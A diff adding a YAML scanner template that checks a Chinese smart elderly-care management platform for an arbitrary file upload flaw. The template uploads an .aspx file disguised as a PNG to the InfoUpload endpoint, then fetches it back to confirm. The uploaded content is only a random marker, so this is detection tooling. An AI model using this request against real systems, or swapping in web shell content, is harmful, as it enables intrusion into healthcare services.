@@ -1,0 +1,56 @@
+id: poc-yaml-shecismp-infoupload-anyfile-upload
+info:
+  name: 智慧医养综合服务管理平台 InfoUpload 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: "{{rand_text_alphanumeric(7)}}"
+  t2: "{{base64(t1)}}"
+  dt: "{{concat(date_time('%Y'),date_time('%m'),date_time('%d'))}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /WebData/InfoUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+        Content-Type: image/png
+
+        {{t2}}
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "上传成功"
+          - ".aspx"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "(?P<file>[0-9a-z_]+).aspx"
+        internal: true
+
+  - raw:
+      - |
+        GET /UpLoadUserExcel/{{dt}}/{{file}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{t2}}"
+      - type: status
+        status:
+          - 200
